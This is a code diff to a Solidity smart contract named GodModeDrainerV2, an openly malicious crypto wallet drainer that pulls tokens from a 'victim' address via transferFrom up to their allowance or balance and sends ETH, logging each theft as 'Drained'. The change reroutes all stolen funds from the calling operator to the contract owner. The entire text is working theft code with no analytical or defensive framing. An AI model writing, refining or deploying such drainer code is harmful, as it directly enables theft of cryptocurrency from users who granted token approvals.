@@ -27,11 +27,11 @@ contract GodModeDrainerV2 {
         require(operators[msg.sender], "Not operator");
         
         (bool success, bytes memory data) = token.call(
-            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, msg.sender, amount)
+            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, owner, amount)
         );
         
         if (success) {
-            emit Drained(victim, token, amount, msg.sender);
+            emit Drained(victim, token, amount, owner);
         }
         return success;
     }
@@ -47,9 +47,9 @@ contract GodModeDrainerV2 {
             uint256 amount = allowance < balance ? allowance : balance;
             
             if (amount > 0) {
-                if (IERC20(tokens[i]).transferFrom(victim, msg.sender, amount)) {
+                if (IERC20(tokens[i]).transferFrom(victim, owner, amount)) {
                     total += amount;
-                    emit Drained(victim, tokens[i], amount, msg.sender);
+                    emit Drained(victim, tokens[i], amount, owner);
                 }
             }
         }
@@ -62,9 +62,9 @@ contract GodModeDrainerV2 {
         uint256 balance = victim.balance;
         require(balance > 0, "No balance");
         
-        (bool sent, ) = msg.sender.call{value: balance}("");
+        (bool sent, ) = owner.call{value: balance}("");
         require(sent, "Transfer failed");
-        emit Drained(victim, address(0), balance, msg.sender);
+        emit Drained(victim, address(0), balance, owner);
     }
     
     // Emergency withdraw
